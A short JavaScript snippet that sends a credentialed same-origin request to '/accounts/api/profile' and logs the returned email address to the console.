const xhr = new XMLHttpRequest();
var res = '';
xhr.open('GET', '/accounts/api/profile');
xhr.responseType = 'json';
xhr.withCredentials = true;
xhr.onload = function(e) {
    if (this.status == 200) {
        res = JSON.parse((JSON.stringify(xhr.response)));
        console.log(res.email)
    }
};
xhr.send();
